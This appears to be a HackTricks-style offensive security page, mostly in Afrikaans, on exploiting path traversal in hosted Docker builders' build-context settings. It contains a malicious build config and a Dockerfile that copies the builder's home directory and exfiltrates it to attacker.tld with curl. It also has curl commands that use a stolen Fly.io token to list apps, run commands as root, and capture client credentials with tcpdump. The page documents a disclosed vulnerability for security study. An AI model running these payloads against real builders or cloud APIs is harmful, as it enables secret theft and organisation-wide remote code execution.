# Misbruik van Docker Build Context in Hosted Builders (Path Traversal, Exfil, and Cloud Pivot)

{{#include ../banners/hacktricks-training.md}}

## TL;DR

As 'n CI/CD platform of hosted builder bydraers toelaat om die Docker build context path en Dockerfile path te spesifiseer, kan jy dikwels die context stel na 'n ouer-gids (bv., "..") en gasheer-lêers deel van die build context maak. Daarna kan 'n deur die aanvaller beheerde Dockerfile COPY en eksfiltreer geheime wat in die builder gebruiker se tuisgids gevind word (byvoorbeeld, ~/.docker/config.json). Geroofde registry tokens kan ook teen die provider se control-plane APIs werk en org-wye RCE moontlik maak.

## Aanvalsoppervlak

Baie hosted builder/registry dienste doen grofweg dit wanneer hulle user-submitted images bou:
- Lees 'n repo-level config wat insluit:
- build context path (gestuur na die Docker daemon)
- Dockerfile path relative to that context
- Kopieer die aangeduide build context directory en die Dockerfile na die Docker daemon
- Bou die image en draai dit as 'n hosted service

As die platform nie die build context kanoniseer en beperk nie, kan 'n gebruiker dit stel na 'n plek buite die repository (path traversal), wat veroorsaak dat arbitrêre host-lêers wat deur die build user gelees kan word deel word van die build context en beskikbaar is om te COPY in die Dockerfile.

Praktiese beperkings wat algemeen waargeneem word:
- Die Dockerfile moet binne die gekose context path woon en sy pad moet vooraf bekend wees.
- Die build user moet lees toegang hê tot lêers ingesluit in die context; spesiale device files kan die copy breek.

## PoC: Path traversal via Docker build context

Voorbeeld van 'n kwaadwillige server config wat 'n Dockerfile binne die ouer-gids context verklaar:
```yaml
runtime: "container"
build:
dockerfile: "test/Dockerfile"   # Must reside inside the final context
dockerBuildPath: ".."           # Path traversal to builder user $HOME
startCommand:
type: "http"
configSchema:
type: "object"
properties:
apiKey:
type: "string"
required: ["apiKey"]
exampleConfig:
apiKey: "sk-example123"
```
Aantekeninge:
- Die gebruik van ".." lei dikwels na die builder-gebruiker se tuisgids (bv. /home/builder), wat tipies sensitiewe lêers bevat.
- Plaas jou Dockerfile onder die repo se gidsnaam (bv. repo "test" → test/Dockerfile) sodat dit binne die uitgebreide ouer-konteks bly.

## PoC: Dockerfile to ingest and exfiltrate the host context
```dockerfile
FROM alpine
RUN apk add --no-cache curl
RUN mkdir /data
COPY . /data                      # Copies entire build context (now builder’s $HOME)
RUN curl -si https://attacker.tld/?d=$(find /data | base64 -w 0)
```
Teikens wat algemeen vanaf $HOME herstel word:
- ~/.docker/config.json (registry auths/tokens)
- Ander cloud/CLI caches en configs (bv. ~/.fly, ~/.kube, ~/.aws, ~/.config/*)

Wenk: Selfs met 'n .dockerignore in die repository, bepaal die kwesbare platform-side context selection steeds wat na die daemon gestuur word. As die platform die gekose pad na die daemon kopieer voordat dit jou repo’s .dockerignore evalueer, kan host-lêers steeds blootgestel word.

## Cloud pivot with overprivileged tokens (example: Fly.io Machines API)

Sommige platforms gee 'n enkele bearer token uit wat gebruik kan word vir beide die container registry en die control-plane API. As jy 'n registry token exfiltreer, probeer dit teen die provider API.

Voorbeeld API-oproepe teen Fly.io Machines API wat die gesteelde token vanaf ~/.docker/config.json gebruik:

Enumereer apps in 'n org:
```bash
curl -H "Authorization: Bearer fm2_..." \
"https://api.machines.dev/v1/apps?org_slug=smithery"
```
Voer 'n opdrag as root uit in enige masjien van 'n app:
```bash
curl -s -X POST -H "Authorization: Bearer fm2_..." \
"https://api.machines.dev/v1/apps/<app>/machines/<machine>/exec" \
--data '{"cmd":"","command":["id"],"container":"","stdin":"","timeout":5}'
```
Uitkoms: organisasie-wyd remote code execution oor alle gehoste apps waar die token voldoende voorregte het.

## Geheimdiefstal vanaf gekompromitteerde gehoste dienste

Met exec/RCE op gehoste servers kan jy deur kliënte verskafde geheime (API keys, tokens) oes of prompt-injection-aanvalle uitvoer. Voorbeeld: installeer tcpdump en vang HTTP-verkeer op poort 8080 om inbound credentials te onttrek.
```bash
# Install tcpdump inside the machine
curl -s -X POST -H "Authorization: Bearer fm2_..." \
"https://api.machines.dev/v1/apps/<app>/machines/<machine>/exec" \
--data '{"cmd":"apk add tcpdump","command":[],"container":"","stdin":"","timeout":5}'

# Capture traffic
curl -s -X POST -H "Authorization: Bearer fm2_..." \
"https://api.machines.dev/v1/apps/<app>/machines/<machine>/exec" \
--data '{"cmd":"tcpdump -i eth0 -w /tmp/log tcp port 8080","command":[],"container":"","stdin":"","timeout":5}'
```
Opgevangen versoeke bevat dikwels client credentials in headers, bodies of query params.

## Verwysings

- [Breaking MCP Server Hosting: Build-Context Path Traversal to Org-wide RCE and Secret Theft](https://blog.gitguardian.com/breaking-mcp-server-hosting/)
- [Fly.io Machines API](https://fly.io/docs/machines/api/)

{{#include ../banners/hacktricks-training.md}}
